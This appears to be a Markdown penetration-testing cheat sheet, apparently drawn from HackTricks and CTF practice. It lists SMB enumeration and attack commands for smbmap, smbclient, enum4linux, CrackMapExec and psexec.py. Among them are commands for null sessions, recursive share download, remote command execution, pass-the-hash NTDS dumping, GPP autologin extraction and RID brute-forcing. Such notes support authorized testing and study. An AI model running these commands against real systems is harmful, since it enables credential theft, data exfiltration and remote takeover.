---
id: smb
title: SMB - 139,445
---

### Smbmap

```bash
smbmap -H <IP> 
```

#### Null Session
```bash
smbmap -H <IP> -u 'null'
```

#### Autenticacion con credenciales
```bash
smbmap -H <IP> -u user -p 'password'
```

#### Listar directorio
```bash
smbmap -H <IP> -r directorio/
```


### Smbclient
#### Listar directorios
```bash
smbclient -L <IP>
```

```bash
smbclient //<IP>/<Directory>
```
#### Autenticación anónima
```bash
smbclient -L <IP> -U guest%
smbclient //<IP>/<Directory> -U guest%
```
#### Autenticación anónima Null Session
```bash
smbclient -L <IP> -N
```
#### Uso no interactivo
```
smbclient -L <IP>/Dir -U guest% -c 'ls'
```

#### Autenticación 
```bash
smbclient //<IP>/Dir -U 'domain.domain/user%P4ssw0rd'
```

#### Descarga recursiva
```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```

Commands:
- mask: specifies the mask which is used to filter the files within the directory (e.g. "" for all files)
- recurse: toggles recursion on (default: off)
- prompt: toggles prompting for filenames off (default: on)
- mget: copies all files matching the mask from host to client machine

(_Information from the manpage of smbclient_)

### smbserver

```bash
smbserver.py smbFolder $(pwd) -smb2support
```

### CrackMapExec

```bash
crackmapexec smb <IP> 
```

```bash
crackmapexec smb <IP> --shares
```

```bash
crackmapexec smb 10.10.10.161 -u 'user' -p 'password' --shares
```

```bash
crackmapexec smb 10.10.10.161 -u 'user' -p 'password' -x 'whoami'
```

```bash
crackmapexec smb 10.10.10.161 -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6' --ntds vss
```

#### gpp_autologin

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

#### rid-brute

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M --rid-brute
```

### psexec.py

```bash
psexec.py domain.domain/USER:Password@ip.ip.ip.ip
```

### enum4linux

```bash
enum4linux -a <IP>
```

https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb